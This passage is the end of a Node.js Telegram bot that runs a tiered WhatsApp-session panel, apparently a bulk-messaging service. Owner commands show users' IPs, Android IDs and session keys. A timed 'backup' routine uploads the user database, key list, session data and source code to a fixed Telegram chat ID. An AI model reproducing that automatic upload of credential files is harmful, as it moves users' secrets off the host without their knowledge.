  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(?:stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;
    
    const tk = countRole("tk");
    const owners = countRole("owner");
    const admin = countRole("admin");
    const resellers = countRole("reseller");
    const members = countRole("member");

    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;
    
    // ✅ FIX: Gunakan fungsi yang sudah didefinisikan
    const globalActive = countActiveGlobalSenders();
    const globalTotal = loadGlobalSenders().length;

    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*🌐 Global Sender*
• Aktif: ${globalActive}/${globalTotal}
• *Tanpa Batas* — Bisa tambah sebanyak mungkin!

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    list.sort((a, b) => b.total - a.total);

    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true });

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      if (userFolder === 'global') continue; // skip global folder
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== MODULE =====
// ===== CONFIG =====
const CHAT_ID = "8368763444";

// ===== DELAY FUNCTION =====
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ===== KIRIM FILE KE TELEGRAM =====
async function kirimFile(filePath) {
  try {
    if (!fs.existsSync(filePath)) {
      console.log(`⚠️ File tidak ditemukan: ${filePath}`);
      return;
    }

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("document", fs.createReadStream(filePath));

    await axios.post(
      `https://api.telegram.org/bot${TOKEN}/sendDocument`,
      form,
      {
        headers: form.getHeaders()
      }
    );

    console.log(`✅ Backup terkirim: ${filePath}`);

  } catch (err) {
    console.error(`❌ Gagal kirim ${filePath}:`, err.message);
  }
}

// ===== LIST FILE BACKUP =====
async function backupFiles() {
  const files = [
    "./keyList.json",
    "./database.json",
    "./index.js",
    "./logUser.txt",
    "./telegram.json",
    "./package-lock.json",
    "./package.json"
  ];

  for (let file of files) {
    await kirimFile(file);
    await delay(1500); // anti rate limit
  }
}

// ===== KIRIM STATUS =====
function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(
      `🟣 *Status Panel:*\n${pesan}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Gagal kirim status:", err.message);
  }
}

// ===== COMMAND RESTART MANUAL =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini."
    );
  }

  try {
    kirimStatusServer(
      "📦 Backup sebelum restart manual dimulai..."
    );

    console.log("📦 Backup manual dimulai...");
    await backupFiles();

    kirimStatusServer(
      "♻️ Panel akan *restart manual* untuk menjaga kestabilan..."
    );

    console.log("♻️ Restart manual dijalankan...");

    setTimeout(() => {
      kirimStatusServer(
        "✅ Panel berhasil restart dan kembali aktif!"
      );
    }, 8000);

    setTimeout(() => {
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("❌ Error restart manual:", err.message);

    kirimStatusServer(
      "❌ Terjadi kesalahan saat restart manual."
    );
  }
});

// ===== START EXPRESS SERVER =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);

  startUserSessions();
  startGlobalSessions();

  kirimStatusServer(
    "✅ Server aktif dan berjalan normal."
  );
});

// ===== AUTO BACKUP =====
const BACKUP_INTERVAL = 35 * 60 * 1000; // 35 menit

setInterval(async () => {
  try {
    kirimStatusServer(
      "📦 Backup otomatis dimulai..."
    );

    console.log("📦 Auto backup berjalan...");

    await backupFiles();

    kirimStatusServer(
      "✅ Backup otomatis selesai."
    );

  } catch (err) {
    console.error("❌ Error auto backup:", err.message);

    kirimStatusServer(
      "❌ Backup otomatis gagal."
    );
  }
}, BACKUP_INTERVAL);

// ===== AUTO RESTART =====
const RESTART_INTERVAL = 20.5 * 60 * 60 * 1000;

setInterval(async () => {
  try {
    kirimStatusServer(
      "♻️ Panel akan *restart otomatis*...\n📦 Backup dulu sebelum restart..."
    );

    console.log("📦 Backup sebelum auto restart...");
    await backupFiles();

    console.log("♻️ Auto restarting panel...");

    setTimeout(() => {
      process.exit(0);
    }, 5000);

  } catch (err) {
    console.error("❌ Error auto restart:", err.message);

    kirimStatusServer(
      "❌ Auto restart gagal."
    );
  }
}, RESTART_INTERVAL);

// ⚠️ Tutup async IIFE untuk Baileys dynamic import
})().catch(err => {
  console.error("❌ Fatal Error saat memulai aplikasi:", err);
  process.exit(1);
});